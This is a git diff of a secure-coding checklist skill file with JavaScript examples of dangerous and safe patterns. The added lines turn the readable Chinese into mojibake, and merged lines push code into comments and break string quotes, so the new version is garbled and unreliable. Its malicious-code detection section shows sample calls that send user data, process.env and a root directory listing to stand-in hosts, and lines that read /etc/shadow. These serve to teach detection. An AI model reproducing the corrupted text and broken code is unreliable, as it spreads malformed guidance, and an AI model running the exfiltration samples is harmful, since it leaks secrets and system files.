@@ -1,60 +1,36 @@
----
+﻿---
 name: code-security-check
 description: >
-  代码安全检查技能 — 杰克专用的安全扫描工具。
-  涵盖：A) 代码安全检查清单 B) 恶意代码检测 C) 安全编程规范
-  适用场景：
-  - 写完代码后，进行安全检查
-  - 审查第三方代码
-  - 学习安全编程知识
-  触发时机：任何代码写入操作完成后。
-  这是给 Claude 自己用的安全检查工具，不是 OpenClaw 技能。
----
+  浠ｇ爜瀹夊叏妫€鏌ユ妧鑳?鈥?鏉板厠涓撶敤鐨勫畨鍏ㄦ壂鎻忓伐鍏枫€?  娑电洊锛欰) 浠ｇ爜瀹夊叏妫€鏌ユ竻鍗?B) 鎭舵剰浠ｇ爜妫€娴?C) 瀹夊叏缂栫▼瑙勮寖
+  閫傜敤鍦烘櫙锛?  - 鍐欏畬浠ｇ爜鍚庯紝杩涜瀹夊叏妫€鏌?  - 瀹℃煡绗笁鏂逛唬鐮?  - 瀛︿範瀹夊叏缂栫▼鐭ヨ瘑
+  瑙﹀彂鏃舵満锛氫换浣曚唬鐮佸啓鍏ユ搷浣滃畬鎴愬悗銆?  杩欐槸缁?Claude 鑷繁鐢ㄧ殑瀹夊叏妫€鏌ュ伐鍏凤紝涓嶆槸 OpenClaw 鎶€鑳姐€?---
 
-# 代码安全检查 (Code Security Check)
+# 浠ｇ爜瀹夊叏妫€鏌?(Code Security Check)
 
-> **原则**：安全无小事，预防胜于治疗！
+> **鍘熷垯**锛氬畨鍏ㄦ棤灏忎簨锛岄闃茶儨浜庢不鐤楋紒
 >
-> **目标**：让每一行代码都经得起安全审查！
+> **鐩爣**锛氳姣忎竴琛屼唬鐮侀兘缁忓緱璧峰畨鍏ㄥ鏌ワ紒
 
 ---
 
-## 📋 三大检查模块
-
+## 馃搵 涓夊ぇ妫€鏌ユā鍧?
 ```
-┌─────────────────────────────────────────────────────────┐
-│  Module A: 代码安全检查清单                              │
-│  → 每次写代码后必须过的检查表                            │
-├─────────────────────────────────────────────────────────┤
-│  Module B: 恶意代码检测                                  │
-│  → 识别可疑代码模式，防止无心之失                        │
-├─────────────────────────────────────────────────────────┤
-│  Module C: 安全编程规范                                  │
-│  → OWASP Top 10 + 安全编码最佳实践                       │
-└─────────────────────────────────────────────────────────┘
-```
+鈹屸攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹?鈹? Module A: 浠ｇ爜瀹夊叏妫€鏌ユ竻鍗?                             鈹?鈹? 鈫?姣忔鍐欎唬鐮佸悗蹇呴』杩囩殑妫€鏌ヨ〃                            鈹?鈹溾攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹?鈹? Module B: 鎭舵剰浠ｇ爜妫€娴?                                 鈹?鈹? 鈫?璇嗗埆鍙枒浠ｇ爜妯″紡锛岄槻姝㈡棤蹇冧箣澶?                       鈹?鈹溾攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹?鈹? Module C: 瀹夊叏缂栫▼瑙勮寖                                  鈹?鈹? 鈫?OWASP Top 10 + 瀹夊叏缂栫爜鏈€浣冲疄璺?                      鈹?鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹?```
 
 ---
 
-## 🔒 Module A: 代码安全检查清单
-
-### A1. 敏感信息检查
-
-**检查项**：
-- [ ] 有硬编码的密码吗？
-- [ ] 有硬编码的 API 密钥吗？
-- [ ] 有硬编码的 Token 吗？
-- [ ] 有硬编码的数据库连接字符串吗？
-- [ ] 有写死的私人信息（邮箱、手机号）吗？
-
-**危险信号**：
-```javascript
-// ❌ 危险
+## 馃敀 Module A: 浠ｇ爜瀹夊叏妫€鏌ユ竻鍗?
+### A1. 鏁忔劅淇℃伅妫€鏌?
+**妫€鏌ラ」**锛?- [ ] 鏈夌‖缂栫爜鐨勫瘑鐮佸悧锛?- [ ] 鏈夌‖缂栫爜鐨?API 瀵嗛挜鍚楋紵
+- [ ] 鏈夌‖缂栫爜鐨?Token 鍚楋紵
+- [ ] 鏈夌‖缂栫爜鐨勬暟鎹簱杩炴帴瀛楃涓插悧锛?- [ ] 鏈夊啓姝荤殑绉佷汉淇℃伅锛堥偖绠便€佹墜鏈哄彿锛夊悧锛?
+**鍗遍櫓淇″彿**锛?```javascript
+// 鉂?鍗遍櫓
 const password = "admin123";
-const apiKey = "sk-1234567890abcdef";
+const apiKey = "sk-REDACTED";
 const dbUrl = "mysql://root:password@localhost/mydb";
 
-// ✅ 安全
+// 鉁?瀹夊叏
 const password = process.env.DB_PASSWORD;
 const apiKey = process.env.API_KEY;
 const dbUrl = process.env.DATABASE_URL;
@@ -62,68 +38,58 @@ const dbUrl = process.env.DATABASE_URL;
 
 ---
 
-### A2. 注入漏洞检查
-
-**SQL 注入**：
-- [ ] 有字符串拼接 SQL 吗？
-- [ ] 用户输入直接进入查询吗？
-- [ ] 用了参数化查询吗？
-
+### A2. 娉ㄥ叆婕忔礊妫€鏌?
+**SQL 娉ㄥ叆**锛?- [ ] 鏈夊瓧绗︿覆鎷兼帴 SQL 鍚楋紵
+- [ ] 鐢ㄦ埛杈撳叆鐩存帴杩涘叆鏌ヨ鍚楋紵
+- [ ] 鐢ㄤ簡鍙傛暟鍖栨煡璇㈠悧锛?
 ```javascript
-// ❌ 危险 - SQL 注入
+// 鉂?鍗遍櫓 - SQL 娉ㄥ叆
 const sql = `SELECT * FROM users WHERE id = ${userId}`;
 db.query(sql);
 
-// ✅ 安全 - 参数化查询
-const sql = 'SELECT * FROM users WHERE id = ?';
+// 鉁?瀹夊叏 - 鍙傛暟鍖栨煡璇?const sql = 'SELECT * FROM users WHERE id = ?';
 db.query(sql, [userId]);
 ```
 
-**命令注入**：
-- [ ] 有字符串拼接 shell 命令吗？
-- [ ] 用户输入直接进 exec 吗？
-- [ ] 用了安全的 API 吗？
+**鍛戒护娉ㄥ叆**锛?- [ ] 鏈夊瓧绗︿覆鎷兼帴 shell 鍛戒护鍚楋紵
+- [ ] 鐢ㄦ埛杈撳叆鐩存帴杩?exec 鍚楋紵
+- [ ] 鐢ㄤ簡瀹夊叏鐨?API 鍚楋紵
 
 ```javascript
-// ❌ 危险 - 命令注入
+// 鉂?鍗遍櫓 - 鍛戒护娉ㄥ叆
 const filename = userInput;
 exec(`cat ${filename}`);
 
-// ✅ 安全 - 使用 API
+// 鉁?瀹夊叏 - 浣跨敤 API
 const filename = userInput;
 fs.readFile(filename, callback);
 ```
 
-**XSS（跨站脚本）**：
-- [ ] 用户输入直接输出到 HTML 吗？
-- [ ] 有用 innerHTML 吗？
-- [ ] 有转义特殊字符吗？
-
+**XSS锛堣法绔欒剼鏈級**锛?- [ ] 鐢ㄦ埛杈撳叆鐩存帴杈撳嚭鍒?HTML 鍚楋紵
+- [ ] 鏈夌敤 innerHTML 鍚楋紵
+- [ ] 鏈夎浆涔夌壒娈婂瓧绗﹀悧锛?
 ```javascript
-// ❌ 危险 - XSS
+// 鉂?鍗遍櫓 - XSS
 element.innerHTML = userInput;
 
-// ✅ 安全 - 转义或使用 textContent
+// 鉁?瀹夊叏 - 杞箟鎴栦娇鐢?textContent
 element.textContent = userInput;
-// 或使用转义函数
-element.innerHTML = escapeHtml(userInput);
+// 鎴栦娇鐢ㄨ浆涔夊嚱鏁?element.innerHTML = escapeHtml(userInput);
 ```
 
 ---
 
-### A3. 路径遍历检查
-
-**检查项**：
-- [ ] 用户输入直接用于文件路径吗？
-- [ ] 有验证文件在允许的目录内吗？
-- [ ] 有处理 ../ 攻击吗？
+### A3. 璺緞閬嶅巻妫€鏌?
+**妫€鏌ラ」**锛?- [ ] 鐢ㄦ埛杈撳叆鐩存帴鐢ㄤ簬鏂囦欢璺緞鍚楋紵
+- [ ] 鏈夐獙璇佹枃浠跺湪鍏佽鐨勭洰褰曞唴鍚楋紵
+- [ ] 鏈夊鐞?../ 鏀诲嚮鍚楋紵
 
 ```javascript
-// ❌ 危险 - 路径遍历
+// 鉂?鍗遍櫓 - 璺緞閬嶅巻
 const filePath = `/uploads/${userFilename}`;
 fs.readFile(filePath);
 
-// ✅ 安全 - 验证路径
+// 鉁?瀹夊叏 - 楠岃瘉璺緞
 const safePath = path.resolve('/uploads', path.basename(userFilename));
 if (!safePath.startsWith('/uploads/')) throw new Error('Invalid path');
 fs.readFile(safePath);
@@ -131,24 +97,16 @@ fs.readFile(safePath);
 
 ---
 
-### A4. 认证授权检查
-
-**检查项**：
-- [ ] 有验证用户身份吗？
-- [ ] 有检查用户权限吗？
-- [ ] Token 验证了吗？
-- [ ] Session 过期时间设置了吗？
-
+### A4. 璁よ瘉鎺堟潈妫€鏌?
+**妫€鏌ラ」**锛?- [ ] 鏈夐獙璇佺敤鎴疯韩浠藉悧锛?- [ ] 鏈夋鏌ョ敤鎴锋潈闄愬悧锛?- [ ] Token 楠岃瘉浜嗗悧锛?- [ ] Session 杩囨湡鏃堕棿璁剧疆浜嗗悧锛?
 ```javascript
-// ❌ 危险 - 无认证
-function getUserData(userId) {
+// 鉂?鍗遍櫓 - 鏃犺璇?function getUserData(userId) {
   return db.query('SELECT * FROM users WHERE id = ?', [userId]);
 }
 
-// ✅ 安全 - 验证身份和权限
-function getUserData(currentUserId, targetUserId) {
+// 鉁?瀹夊叏 - 楠岃瘉韬唤鍜屾潈闄?function getUserData(currentUserId, targetUserId) {
   if (currentUserId !== targetUserId) {
-    throw new Error('无权访问');
+    throw new Error('鏃犳潈璁块棶');
   }
   return db.query('SELECT * FROM users WHERE id = ?', [targetUserId]);
 }
@@ -156,33 +114,25 @@ function getUserData(currentUserId, targetUserId) {
 
 ---
 
-### A5. 数据验证检查
-
-**检查项**：
-- [ ] 所有用户输入都验证了吗？
-- [ ] 有类型检查吗？
-- [ ] 有长度限制吗？
-- [ ] 有格式验证吗（邮箱、手机号）？
+### A5. 鏁版嵁楠岃瘉妫€鏌?
+**妫€鏌ラ」**锛?- [ ] 鎵€鏈夌敤鎴疯緭鍏ラ兘楠岃瘉浜嗗悧锛?- [ ] 鏈夌被鍨嬫鏌ュ悧锛?- [ ] 鏈夐暱搴﹂檺鍒跺悧锛?- [ ] 鏈夋牸寮忛獙璇佸悧锛堥偖绠便€佹墜鏈哄彿锛夛紵
 
 ```javascript
-// ❌ 危险 - 无验证
-function createUser(data) {
+// 鉂?鍗遍櫓 - 鏃犻獙璇?function createUser(data) {
   return db.insert('users', data);
 }
 
-// ✅ 安全 - 全面验证
+// 鉁?瀹夊叏 - 鍏ㄩ潰楠岃瘉
 function createUser(data) {
-  // 类型检查
-  if (typeof data.username !== 'string') throw new Error('用户名必须是字符串');
+  // 绫诲瀷妫€鏌?  if (typeof data.username !== 'string') throw new Error('鐢ㄦ埛鍚嶅繀椤绘槸瀛楃涓?);
 
-  // 长度限制
-  if (data.username.length > 50) throw new Error('用户名太长');
+  // 闀垮害闄愬埗
+  if (data.username.length > 50) throw new Error('鐢ㄦ埛鍚嶅お闀?);
 
-  // 格式验证
-  if (!isValidEmail(data.email)) throw new Error('邮箱格式错误');
+  // 鏍煎紡楠岃瘉
+  if (!isValidEmail(data.email)) throw new Error('閭鏍煎紡閿欒');
 
-  // 白名单过滤
-  const allowedFields = ['username', 'email', 'password'];
+  // 鐧藉悕鍗曡繃婊?  const allowedFields = ['username', 'email', 'password'];
   const sanitized = Object.keys(data)
     .filter(k => allowedFields.includes(k))
     .reduce((obj, k) => ({ ...obj, [k]: data[k] }), {});
@@ -193,104 +143,83 @@ function createUser(data) {
 
 ---
 
-### A6. 错误处理检查
-
-**检查项**：
-- [ ] 有捕获异常吗？
-- [ ] 错误信息会暴露敏感信息吗？
-- [ ] 有日志记录吗？
-- [ ] 有统一的错误响应格式吗？
-
+### A6. 閿欒澶勭悊妫€鏌?
+**妫€鏌ラ」**锛?- [ ] 鏈夋崟鑾峰紓甯稿悧锛?- [ ] 閿欒淇℃伅浼氭毚闇叉晱鎰熶俊鎭悧锛?- [ ] 鏈夋棩蹇楄褰曞悧锛?- [ ] 鏈夌粺涓€鐨勯敊璇搷搴旀牸寮忓悧锛?
 ```javascript
-// ❌ 危险 - 暴露敏感信息
+// 鉂?鍗遍櫓 - 鏆撮湶鏁忔劅淇℃伅
 try {
   db.query(sql);
 } catch (e) {
-  res.send(`数据库错误：${e.message} - SQL: ${sql}`);
+  res.send(`鏁版嵁搴撻敊璇細${e.message} - SQL: ${sql}`);
 }
 
-// ✅ 安全 - 隐藏敏感信息
+// 鉁?瀹夊叏 - 闅愯棌鏁忔劅淇℃伅
 try {
   db.query(sql);
 } catch (e) {
-  logger.error('数据库查询失败', { error: e.message, userId });
-  res.status(500).json({ error: 'INTERNAL_ERROR', message: '服务器内部错误' });
+  logger.error('鏁版嵁搴撴煡璇㈠け璐?, { error: e.message, userId });
+  res.status(500).json({ error: 'INTERNAL_ERROR', message: '鏈嶅姟鍣ㄥ唴閮ㄩ敊璇? });
 }
 ```
 
 ---
 
-### A7. 日志安全檢查
+### A7. 鏃ュ織瀹夊叏妾㈡煡
 
-**检查项**：
-- [ ] 日志里有密码吗？
-- [ ] 日志里有 Token 吗？
-- [ ] 日志里有完整信用卡号吗？
-- [ ] 日志里有身份证号吗？
+**妫€鏌ラ」**锛?- [ ] 鏃ュ織閲屾湁瀵嗙爜鍚楋紵
+- [ ] 鏃ュ織閲屾湁 Token 鍚楋紵
+- [ ] 鏃ュ織閲屾湁瀹屾暣淇＄敤鍗″彿鍚楋紵
+- [ ] 鏃ュ織閲屾湁韬唤璇佸彿鍚楋紵
 
 ```javascript
-// ❌ 危险 - 记录敏感信息
-logger.info('用户登录', { password: user.password, token });
+// 鉂?鍗遍櫓 - 璁板綍鏁忔劅淇℃伅
+logger.info('鐢ㄦ埛鐧诲綍', { password: user.password, token });
 
-// ✅ 安全 - 脱敏记录
-logger.info('用户登录', { userId: user.id, timestamp: Date.now() });
+// 鉁?瀹夊叏 - 鑴辨晱璁板綍
+logger.info('鐢ㄦ埛鐧诲綍', { userId: user.id, timestamp: Date.now() });
 ```
 
 ---
 
-### A8. 依赖安全检查
-
-**检查项**：
-- [ ] 依赖都是官方源吗？
-- [ ] 有严重漏洞的依赖吗？
-- [ ] 依赖版本锁定了吗？
-
+### A8. 渚濊禆瀹夊叏妫€鏌?
+**妫€鏌ラ」**锛?- [ ] 渚濊禆閮芥槸瀹樻柟婧愬悧锛?- [ ] 鏈変弗閲嶆紡娲炵殑渚濊禆鍚楋紵
+- [ ] 渚濊禆鐗堟湰閿佸畾浜嗗悧锛?
 ```bash
-# 检查漏洞
-npm audit
+# 妫€鏌ユ紡娲?npm audit
 npx audit-ci
 
-# 检查过时的依赖
+# 妫€鏌ヨ繃鏃剁殑渚濊禆
 npm outdated
 
-# 锁定版本
-package-lock.json / yarn.lock 必须提交
+# 閿佸畾鐗堟湰
+package-lock.json / yarn.lock 蹇呴』鎻愪氦
 ```
 
 ---
 
-### A9. 文件上传检查
-
-**检查项**：
-- [ ] 有验证文件类型吗？
-- [ ] 有大小限制吗？
-- [ ] 文件名安全处理了吗？
-- [ ] 存储目录可执行脚本吗？
-
+### A9. 鏂囦欢涓婁紶妫€鏌?
+**妫€鏌ラ」**锛?- [ ] 鏈夐獙璇佹枃浠剁被鍨嬪悧锛?- [ ] 鏈夊ぇ灏忛檺鍒跺悧锛?- [ ] 鏂囦欢鍚嶅畨鍏ㄥ鐞嗕簡鍚楋紵
+- [ ] 瀛樺偍鐩綍鍙墽琛岃剼鏈悧锛?
 ```javascript
-// ❌ 危险 - 无验证
-app.post('/upload', (req, res) => {
+// 鉂?鍗遍櫓 - 鏃犻獙璇?app.post('/upload', (req, res) => {
   const file = req.files.file;
   file.mv(`/uploads/${file.name}`);
 });
 
-// ✅ 安全 - 全面检查
-app.post('/upload', (req, res) => {
+// 鉁?瀹夊叏 - 鍏ㄩ潰妫€鏌?app.post('/upload', (req, res) => {
   const file = req.files.file;
 
-  // 检查文件类型（白名单）
+  // 妫€鏌ユ枃浠剁被鍨嬶紙鐧藉悕鍗曪級
   const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
   if (!allowedTypes.includes(file.mimetype)) {
-    return res.status(400).json({ error: '不支持的文件类型' });
+    return res.status(400).json({ error: '涓嶆敮鎸佺殑鏂囦欢绫诲瀷' });
   }
 
-  // 检查文件大小（10MB 限制）
-  if (file.size > 10 * 1024 * 1024) {
-    return res.status(400).json({ error: '文件太大' });
+  // 妫€鏌ユ枃浠跺ぇ灏忥紙10MB 闄愬埗锛?  if (file.size > 10 * 1024 * 1024) {
+    return res.status(400).json({ error: '鏂囦欢澶ぇ' });
   }
 
-  // 安全文件名
-  const safeName = `${Date.now()}-${path.basename(file.name)}`;
+  // 瀹夊叏鏂囦欢鍚?  const safeName = `${Date.now()}-${path.basename(file.name)}`;
   const uploadPath = path.resolve('/uploads/images', safeName);
 
   file.mv(uploadPath);
@@ -299,20 +228,16 @@ app.post('/upload', (req, res) => {
 
 ---
 
-### A10. API 安全检查
-
-**检查项**：
-- [ ] 有速率限制吗？
-- [ ] 有 CORS 配置吗？
-- [ ] 有请求体大小限制吗？
-- [ ] 有输入验证吗？
-
+### A10. API 瀹夊叏妫€鏌?
+**妫€鏌ラ」**锛?- [ ] 鏈夐€熺巼闄愬埗鍚楋紵
+- [ ] 鏈?CORS 閰嶇疆鍚楋紵
+- [ ] 鏈夎姹備綋澶у皬闄愬埗鍚楋紵
+- [ ] 鏈夎緭鍏ラ獙璇佸悧锛?
 ```javascript
-// ✅ 安全配置
+// 鉁?瀹夊叏閰嶇疆
 app.use(rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 分钟
-  max: 100 // 最多 100 个请求
-}));
+  windowMs: 15 * 60 * 1000, // 15 鍒嗛挓
+  max: 100 // 鏈€澶?100 涓姹?}));
 
 app.use(cors({
   origin: process.env.ALLOWED_ORIGINS,
@@ -324,297 +249,225 @@ app.use(express.json({ limit: '10mb' }));
 
 ---
 
-## 🚨 Module B: 恶意代码检测
-
-### B1. 可疑的外部请求
-
-**检测模式**：
-```javascript
-// ⚠️ 警惕 - 隐藏的数据外发
-fetch('http://unknown-server.com/log', {
+## 馃毃 Module B: 鎭舵剰浠ｇ爜妫€娴?
+### B1. 鍙枒鐨勫閮ㄨ姹?
+**妫€娴嬫ā寮?*锛?```javascript
+// 鈿狅笍 璀︽儠 - 闅愯棌鐨勬暟鎹鍙?fetch('http://unknown-server.com/log', {
   method: 'POST',
   body: JSON.stringify(userData)
 });
 
-// ⚠️ 警惕 - 奇怪的 API 调用
+// 鈿狅笍 璀︽儠 - 濂囨€殑 API 璋冪敤
 const response = await axios.post('http://xxx.com/collect', {
   env: process.env,
   files: fs.readdirSync('/')
 });
 ```
 
-**检查清单**：
-- [ ] 有请求到不明域名吗？
-- [ ] 有发送敏感数据到外部吗？
-- [ ] 域名是硬编码的吗？
-- [ ] 请求是必要的吗？
+**妫€鏌ユ竻鍗?*锛?- [ ] 鏈夎姹傚埌涓嶆槑鍩熷悕鍚楋紵
+- [ ] 鏈夊彂閫佹晱鎰熸暟鎹埌澶栭儴鍚楋紵
+- [ ] 鍩熷悕鏄‖缂栫爜鐨勫悧锛?- [ ] 璇锋眰鏄繀瑕佺殑鍚楋紵
 
 ---
 
-### B2. 危险的执行函数
-
-**检测模式**：
-```javascript
-// ⚠️ 危险 - eval
+### B2. 鍗遍櫓鐨勬墽琛屽嚱鏁?
+**妫€娴嬫ā寮?*锛?```javascript
+// 鈿狅笍 鍗遍櫓 - eval
 eval(userInput);
 
-// ⚠️ 危险 - Function 构造
-new Function(userInput)();
+// 鈿狅笍 鍗遍櫓 - Function 鏋勯€?new Function(userInput)();
 
-// ⚠️ 危险 - child_process
+// 鈿狅笍 鍗遍櫓 - child_process
 exec(userInput);
 spawn(userInput, { shell: true });
 
-// ⚠️ 危险 - vm 模块
+// 鈿狅笍 鍗遍櫓 - vm 妯″潡
 vm.runInNewContext(userInput);
 ```
 
-**检查清单**：
-- [ ] 有使用 eval 吗？
-- [ ] 有使用 Function 构造器吗？
-- [ ] 有执行 shell 命令吗？
-- [ ] 用户输入能影响执行内容吗？
-
+**妫€鏌ユ竻鍗?*锛?- [ ] 鏈変娇鐢?eval 鍚楋紵
+- [ ] 鏈変娇鐢?Function 鏋勯€犲櫒鍚楋紵
+- [ ] 鏈夋墽琛?shell 鍛戒护鍚楋紵
+- [ ] 鐢ㄦ埛杈撳叆鑳藉奖鍝嶆墽琛屽唴瀹瑰悧锛?
 ---
 
-### B3. 隐藏的定时逻辑
+### B3. 闅愯棌鐨勫畾鏃堕€昏緫
 
-**检测模式**：
-```javascript
-// ⚠️ 警惕 - 延迟执行的可疑代码
-setTimeout(() => {
+**妫€娴嬫ā寮?*锛?```javascript
+// 鈿狅笍 璀︽儠 - 寤惰繜鎵ц鐨勫彲鐤戜唬鐮?setTimeout(() => {
   sendUserDataToExternalServer();
 }, 60000);
 
-// ⚠️ 警惕 - 条件触发的隐藏逻辑
+// 鈿狅笍 璀︽儠 - 鏉′欢瑙﹀彂鐨勯殣钘忛€昏緫
 if (new Date().getHours() === 3) {
   executeHiddenTask();
 }
 ```
 
-**检查清单**：
-- [ ] 有 setTimeout/setInterval 吗？
-- [ ] 有基于时间的条件逻辑吗？
-- [ ] 有隐藏的回调函数吗？
-- [ ] 逻辑的目的是什么？
+**妫€鏌ユ竻鍗?*锛?- [ ] 鏈?setTimeout/setInterval 鍚楋紵
+- [ ] 鏈夊熀浜庢椂闂寸殑鏉′欢閫昏緫鍚楋紵
+- [ ] 鏈夐殣钘忕殑鍥炶皟鍑芥暟鍚楋紵
+- [ ] 閫昏緫鐨勭洰鐨勬槸浠€涔堬紵
 
 ---
 
-### B4. 异常的权限请求
-
-**检测模式**：
-```javascript
-// ⚠️ 警惕 - 请求过高权限
+### B4. 寮傚父鐨勬潈闄愯姹?
+**妫€娴嬫ā寮?*锛?```javascript
+// 鈿狅笍 璀︽儠 - 璇锋眰杩囬珮鏉冮檺
 fs.chmod('/etc/passwd', 0o777);
 process.setuid(0);
 
-// ⚠️ 警惕 - 访问敏感路径
+// 鈿狅笍 璀︽儠 - 璁块棶鏁忔劅璺緞
 fs.readFileSync('/etc/shadow');
 fs.readdirSync('C:/Windows/System32');
 ```
 
-**检查清单**：
-- [ ] 有修改系统文件吗？
-- [ ] 有访问敏感目录吗？
-- [ ] 有提升权限吗？
-- [ ] 权限是必要的吗？
+**妫€鏌ユ竻鍗?*锛?- [ ] 鏈変慨鏀圭郴缁熸枃浠跺悧锛?- [ ] 鏈夎闂晱鎰熺洰褰曞悧锛?- [ ] 鏈夋彁鍗囨潈闄愬悧锛?- [ ] 鏉冮檺鏄繀瑕佺殑鍚楋紵
 
 ---
 
-### B5. 数据混淆检测
+### B5. 鏁版嵁娣锋穯妫€娴?
+**妫€娴嬫ā寮?*锛?```javascript
+// 鈿狅笍 璀︽儠 - Base64 缂栫爜鐨勫彲鐤戞暟鎹?const payload = Buffer.from('c2VjcmV0IGRhdGE=', 'base64').toString();
 
-**检测模式**：
-```javascript
-// ⚠️ 警惕 - Base64 编码的可疑数据
-const payload = Buffer.from('c2VjcmV0IGRhdGE=', 'base64').toString();
-
-// ⚠️ 警惕 - 十六进制编码
+// 鈿狅笍 璀︽儠 - 鍗佸叚杩涘埗缂栫爜
 const code = Buffer.from('636f6e736f6c652e6c6f67282768656c6c6f2729', 'hex').toString();
 
-// ⚠️ 警惕 - 字符串拆分绕过检测
-const fn = 'ev'.split('').reverse().join('');
+// 鈿狅笍 璀︽儠 - 瀛楃涓叉媶鍒嗙粫杩囨娴?const fn = 'ev'.split('').reverse().join('');
 window[fn](maliciousCode);
 ```
 
-**检查清单**：
-- [ ] 有 Base64 编码的字符串吗？
-- [ ] 有十六进制编码吗？
-- [ ] 有动态拼接函数名吗？
-- [ ] 解码后的内容是什么？
+**妫€鏌ユ竻鍗?*锛?- [ ] 鏈?Base64 缂栫爜鐨勫瓧绗︿覆鍚楋紵
+- [ ] 鏈夊崄鍏繘鍒剁紪鐮佸悧锛?- [ ] 鏈夊姩鎬佹嫾鎺ュ嚱鏁板悕鍚楋紵
+- [ ] 瑙ｇ爜鍚庣殑鍐呭鏄粈涔堬紵
 
 ---
 
-### B6. 原型污染检测
-
-**检测模式**：
-```javascript
-// ⚠️ 危险 - 直接合并用户输入
+### B6. 鍘熷瀷姹℃煋妫€娴?
+**妫€娴嬫ā寮?*锛?```javascript
+// 鈿狅笍 鍗遍櫓 - 鐩存帴鍚堝苟鐢ㄦ埛杈撳叆
 Object.assign(target, userInput);
 
-// ⚠️ 危险 - 深度合并无保护
-_.merge(target, userInput);
+// 鈿狅笍 鍗遍櫓 - 娣卞害鍚堝苟鏃犱繚鎶?_.merge(target, userInput);
 
-// ✅ 安全 - 使用 Object.create(null)
+// 鉁?瀹夊叏 - 浣跨敤 Object.create(null)
 const safeObj = Object.create(null);
 ```
 
-**检查清单**：
-- [ ] 有合并用户输入吗？
-- [ ] 有验证 __proto__ 吗？
-- [ ] 使用了安全的库吗？
-
+**妫€鏌ユ竻鍗?*锛?- [ ] 鏈夊悎骞剁敤鎴疯緭鍏ュ悧锛?- [ ] 鏈夐獙璇?__proto__ 鍚楋紵
+- [ ] 浣跨敤浜嗗畨鍏ㄧ殑搴撳悧锛?
 ---
 
-### B7. 反序列化漏洞
+### B7. 鍙嶅簭鍒楀寲婕忔礊
 
-**检测模式**：
-```javascript
-// ⚠️ 危险 - 反序列化用户数据
+**妫€娴嬫ā寮?*锛?```javascript
+// 鈿狅笍 鍗遍櫓 - 鍙嶅簭鍒楀寲鐢ㄦ埛鏁版嵁
 const obj = JSON.parse(userInput);
-// 在某些库中可能触发原型污染
-
-// ⚠️ 危险 - 使用不安全的反序列化
+// 鍦ㄦ煇浜涘簱涓彲鑳借Е鍙戝師鍨嬫薄鏌?
+// 鈿狅笍 鍗遍櫓 - 浣跨敤涓嶅畨鍏ㄧ殑鍙嶅簭鍒楀寲
 deserialize(userInput);
 ```
 
-**检查清单**：
-- [ ] 有反序列化用户输入吗？
-- [ ] 使用了安全的反序列化库吗？
-- [ ] 有验证反序列化结果吗？
-
+**妫€鏌ユ竻鍗?*锛?- [ ] 鏈夊弽搴忓垪鍖栫敤鎴疯緭鍏ュ悧锛?- [ ] 浣跨敤浜嗗畨鍏ㄧ殑鍙嶅簭鍒楀寲搴撳悧锛?- [ ] 鏈夐獙璇佸弽搴忓垪鍖栫粨鏋滃悧锛?
 ---
 
-## 📚 Module C: 安全编程规范
+## 馃摎 Module C: 瀹夊叏缂栫▼瑙勮寖
 
-### C1. OWASP Top 10 防护
+### C1. OWASP Top 10 闃叉姢
 
-#### 1. 注入 (Injection)
+#### 1. 娉ㄥ叆 (Injection)
 ```
-风险：SQL、NoSQL、OS 命令、LDAP 注入
-防护：
-- 使用参数化查询
-- 使用 ORM
-- 输入验证和转义
-- 最小权限原则
-```
+椋庨櫓锛歋QL銆丯oSQL銆丱S 鍛戒护銆丩DAP 娉ㄥ叆
+闃叉姢锛?- 浣跨敤鍙傛暟鍖栨煡璇?- 浣跨敤 ORM
+- 杈撳叆楠岃瘉鍜岃浆涔?- 鏈€灏忔潈闄愬師鍒?```
 
-#### 2. 失效的身份认证 (Broken Authentication)
+#### 2. 澶辨晥鐨勮韩浠借璇?(Broken Authentication)
 ```
-风险：会话固定、凭证填充、暴力破解
-防护：
-- 强密码策略
-- 多因素认证
-- 会话超时
-- 失败次数限制
+椋庨櫓锛氫細璇濆浐瀹氥€佸嚟璇佸～鍏呫€佹毚鍔涚牬瑙?闃叉姢锛?- 寮哄瘑鐮佺瓥鐣?- 澶氬洜绱犺璇?- 浼氳瘽瓒呮椂
+- 澶辫触娆℃暟闄愬埗
 ```
 
-#### 3. 敏感数据泄露 (Sensitive Data Exposure)
+#### 3. 鏁忔劅鏁版嵁娉勯湶 (Sensitive Data Exposure)
 ```
-风险：明文存储密码、传输未加密
-防护：
-- 加密存储（bcrypt、argon2）
-- HTTPS 传输
-- 不记录敏感信息
-- 数据脱敏
+椋庨櫓锛氭槑鏂囧瓨鍌ㄥ瘑鐮併€佷紶杈撴湭鍔犲瘑
+闃叉姢锛?- 鍔犲瘑瀛樺偍锛坆crypt銆乤rgon2锛?- HTTPS 浼犺緭
